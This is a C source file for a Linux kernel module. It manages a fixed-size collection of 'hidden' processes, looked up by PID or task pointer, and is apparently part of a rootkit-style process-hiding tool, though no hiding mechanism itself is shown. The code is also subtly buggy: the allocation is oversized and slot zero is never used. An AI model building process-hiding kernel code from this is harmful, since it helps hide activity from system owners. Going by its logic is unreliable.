#include <linux/slab.h>
#include "HiddenProcessCollection.h"
#include "messagesToUser.h"

#define MAXIMUM_NUMBER_OF_ENTRIES 50

#define NO_ENTRIES_AVAILABLE -1
#define NOT_FOUND -1

static int getIndexOfFreeSpot(HiddenProcessCollection collection);

//TODO: improve the efficiency of this

struct entry {
	RestorableHiddenTask restorableHiddenTask;
	int isInUse;
};

struct hiddenProcessCollection {
	struct entry restorableTasks[MAXIMUM_NUMBER_OF_ENTRIES];
};

// returns NULL on failing
HiddenProcessCollection createHiddenProcessCollection(void) {
	HiddenProcessCollection result = kcalloc(MAXIMUM_NUMBER_OF_ENTRIES, sizeof(struct hiddenProcessCollection), __GFP_NOWARN);

	if (result == NULL) {
		return NULL;
	}

	// initialise any required elements
	// assumes isInUse is set to 0 due to calloc

	return result;
}

int isHiddenProcessCollectionFull(HiddenProcessCollection collection) {
	int freeIndex = getIndexOfFreeSpot(collection);

	return freeIndex == NO_ENTRIES_AVAILABLE;
}

// returns null if the entry is not in use
static struct entry *getEntryNotingTheResultMayBeNull(HiddenProcessCollection collection, int index) {
	struct entry *entry;
	struct entry *result;

	entry = &(collection->restorableTasks[index]);;

	if (!entry->isInUse) {
		result = NULL;
	} else {
		result = entry;
	}

	return result;
}

static int isTaskInUse(HiddenProcessCollection collection, int index) {
	struct entry *entry = getEntryNotingTheResultMayBeNull(collection, index);
	return entry != NULL && entry->isInUse;
}

static int getIndexOfFreeSpot(HiddenProcessCollection collection) {
	int i;
	for (i = 0; i < MAXIMUM_NUMBER_OF_ENTRIES; i++) {
		if (!isTaskInUse(collection, i)) {
			return i;
		}
	}
	return NO_ENTRIES_AVAILABLE;
}

static int getIndexOfEntryWithPid(HiddenProcessCollection collection, int pid) {
	int i;
	for (i = 0; i < MAXIMUM_NUMBER_OF_ENTRIES; i++) {
		struct entry *entry = getEntryNotingTheResultMayBeNull(collection, i);
		if (entry != NULL && entry->restorableHiddenTask->pidNumber == pid) {
			return i;
		}
	}
	return NOT_FOUND;
}

int isPidInCollection(HiddenProcessCollection collection, int pid) {
	return getIndexOfEntryWithPid(collection, pid) != NOT_FOUND;
}

static RestorableHiddenTask removeEntry(HiddenProcessCollection collection, int index) {
	struct entry *entry;

	if (index < 0) {
		printError("attempted to remove an invalid entry\n");
		return NULL;
	}

	entry = getEntryNotingTheResultMayBeNull(collection, index);
	if (entry == NULL) {
		return NULL;
	}
	entry->isInUse = 0;
	return entry->restorableHiddenTask;
}

RestorableHiddenTask removePidFromCollection(HiddenProcessCollection collection, int pid) {
	int index = getIndexOfEntryWithPid(collection, pid);
	return removeEntry(collection, index);
}

static int getIndexOfEntryWithTask(HiddenProcessCollection collection, void *task) {
	int i;
	for (i = 0; i < MAXIMUM_NUMBER_OF_ENTRIES; i++) {
		struct entry *entry = getEntryNotingTheResultMayBeNull(collection, i);
		if (entry != NULL && entry->restorableHiddenTask->task == task) {
			return i;
		}
	}
	return NOT_FOUND;
}

int isTaskInCollection(HiddenProcessCollection collection, void *task) {
	return getIndexOfEntryWithTask(collection, task) != NOT_FOUND;
}

RestorableHiddenTask removeTaskFromCollection(HiddenProcessCollection collection, void *task) {
	int index = getIndexOfEntryWithTask(collection, task);
	return removeEntry(collection, index);
}

void addHiddenProcessToCollection(HiddenProcessCollection collection, RestorableHiddenTask restorableHiddenTask) {
	int index = getIndexOfFreeSpot(collection);
	if (index <= 0) {
		printError("failed to hidden process to collection as it was full. This should have been checked earlier\n");
		return;
	}

	if (restorableHiddenTask == NULL) {
		printError("Attempt to add null restorable task\n");
		return;
	}

	{
		struct entry *entry = &collection->restorableTasks[index];
		entry->isInUse = 1;
		entry->restorableHiddenTask = restorableHiddenTask;
	}
}

void destoryHiddenProcessCollection(HiddenProcessCollection collection) {
	kfree(collection);
}

static int getIndexOfAnyTaskThatIsHidden(HiddenProcessCollection collection) {
	int i;
	for (i = 0; i < MAXIMUM_NUMBER_OF_ENTRIES; i++) {
		struct entry *entry = getEntryNotingTheResultMayBeNull(collection, i);
		if (entry != NULL) {
			return i;
		}
	}
	return NOT_FOUND;
}

RestorableHiddenTask removeAnyHiddenTask(HiddenProcessCollection collection) {
	int index = getIndexOfAnyTaskThatIsHidden(collection);

	RestorableHiddenTask result;
	if (index != NOT_FOUND) {
		result = removeEntry(collection, index);
	} else {
		result = NULL;
	}
	return result;
}
